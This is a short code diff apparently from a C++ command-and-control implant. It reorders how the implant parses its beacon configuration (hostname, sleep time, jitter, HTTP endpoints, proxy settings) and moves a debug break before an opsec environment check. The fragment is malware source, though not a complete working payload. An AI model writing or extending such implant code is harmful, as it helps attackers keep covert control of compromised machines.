@@ -30,6 +30,7 @@ namespace Implant {
             }
 
             if (!Ctx->Session.Checkin) {
+                __debugbreak();
                 Opsec::SeCheckEnvironment();
                 if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                     return_defer(ntstatus);
@@ -63,6 +64,7 @@ namespace Implant {
 
         Parser::ParserBytecpy(&Parser, R_CAST(PBYTE, &Ctx->Root));
         Parser::ParserMemcpy(&Parser, &Ctx->Config.Key, nullptr);
+        Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);
 
         //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
 
@@ -111,9 +113,6 @@ namespace Implant {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
-        __debugbreak();
-        Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname, nullptr);
-
         Ctx->Session.PeerId         = Parser::UnpackDword(&Parser);
         Ctx->Config.Sleeptime       = Parser::UnpackDword(&Parser);
         Ctx->Config.Jitter          = Parser::UnpackDword(&Parser);
@@ -139,11 +138,10 @@ namespace Implant {
         for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
             Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i], nullptr);
         }
-
         Ctx->Transport.http->Endpoints[Ctx->Transport.http->nEndpoints + 1] = nullptr;
-        Ctx->Transport.bProxy = Parser::UnpackBool(&Parser);
 
         Parser::ParserStrcpy(&Parser, &Ctx->Transport.Domain, nullptr  );
+        Ctx->Transport.bProxy = Parser::UnpackBool(&Parser);
 
         if (Ctx->Transport.bProxy) {
             Ctx->Transport.http->Access = INTERNET_OPEN_TYPE_PROXY;
